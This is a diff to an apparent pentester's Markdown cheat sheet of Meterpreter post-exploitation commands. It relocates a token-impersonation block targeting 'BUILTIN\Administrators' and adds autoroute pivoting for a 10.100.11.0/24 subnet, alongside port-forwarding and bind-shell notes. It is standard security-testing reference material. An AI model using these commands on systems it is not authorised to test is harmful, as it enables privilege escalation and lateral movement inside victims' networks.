@@ -37,6 +37,14 @@ load powershell
 powershell_shell
 ```
 
+#### Metasploit imperssonate
+```
+Load incognito
+list_tokens -g
+impersonate_token "BUILTIN\Administrators"
+```
+
+## Routing
 #### Set route
 ```
 route add <subnet / host ip> <subnetmask> <session id>
@@ -47,19 +55,17 @@ route add <subnet / host ip> <subnetmask> <session id>
 use multi/manage/autoroute
 ```
 
+#### Run autoroute
+```
+run autoroute -s 10.100.11.0/24
+```
+
 #### Create port forward
 ```
 Portfwd add -l <LOCAL PORT> -p <REMOTE PORT> -r <REMOTE HOST>
 ```
 
 #### After setting routes use bind shells
-
-#### Metasploit imperssonate
-```
-Load incognito
-list_tokens -g
-impersonate_token "BUILTIN\Administrators"
-```
 
 ## Autorun script
 ### Set solo module as autorunscript
